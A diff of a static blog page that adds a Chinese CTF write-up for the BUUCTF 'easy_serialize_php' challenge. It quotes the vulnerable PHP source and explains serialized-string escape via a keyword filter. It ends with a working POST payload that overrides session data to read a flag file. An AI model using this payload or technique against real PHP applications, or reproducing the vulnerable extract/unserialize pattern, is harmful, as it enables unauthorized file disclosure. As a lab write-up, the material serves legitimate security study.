@@ -150,7 +150,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -172,6 +172,166 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/BUU-easy_serialize_php/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Li1x">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CTF/Web/BUU-easy_serialize_php/" class="post-title-link" itemprop="url">BUU-easy_serialize_php的Wp</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-02-19 08:14:36 / Modified: 08:16:30" itemprop="dateCreated datePublished" datetime="2024-02-19T08:14:36+08:00">2024-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/CTF/Web/BUU-easy_serialize_php/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/BUU-easy_serialize_php/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3.5k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>1.代码审计</p>
+<p>2.PHP反序列化</p>
+<p>3.反序列化中的对象逃逸</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
+<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
+<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
+</blockquote>
+<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
+
+<p>![]CTF&#x2F;Web&#x2F;BUU-easy_serialize_php&#x2F;test00.png)</p>
+<hr>
+<p><strong>如何去构造一个字符串逃逸</strong></p>
+<hr>
+<p><strong>1.键名逃逸</strong></p>
+<p>如何传入$_SESSION[phpflag] 序列化之后</p>
+<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
+<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
+<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合起来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>逃逸成了 </p>
+<p>“;s:48: 的变量名对应的值为1 </p>
+<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
+<p>​	-&gt; 第二个”是传入的值的前引号</p>
+<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
+<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
+<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
+</blockquote>
+<p><strong>2.键值逃逸</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先将自己要写入的代码放进去 也就是$function的值</p>
+<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
+</blockquote>
+<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
+<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
+<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -765,13 +925,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">7k</span>
+    <span title="Word count total">11k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">13 mins.</span>
+    <span title="Reading time total">19 mins.</span>
   </span>
 </div>
 <div class="busuanzi-count">
